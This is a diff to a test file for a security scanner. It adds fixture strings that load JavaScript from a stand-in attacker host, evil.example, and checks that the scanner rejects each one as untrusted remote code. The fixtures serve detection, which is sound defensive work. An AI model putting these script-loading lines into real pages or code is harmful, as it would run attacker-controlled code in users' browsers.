@@ -64,6 +64,8 @@ describe('security scanner', () => {
     "import('https://evil.example/extensionless')",
     "import('https://evil.example/payload.mjs')",
     "script.src = '//evil.example/payload.js'",
+    "document.createElement('script').src = 'https://evil.example/extensionless'",
+    "script.setAttribute('src', 'https://evil.example/extensionless')",
     String.raw`{"loader":"https:\/\/evil.example\/payload.js"}`,
   ])('rejects arbitrary remote executable JavaScript: %s', (text) => {
     expect(scanText('card/fixture.json', text)).toContain('card/fixture.json: untrusted remote executable JavaScript');
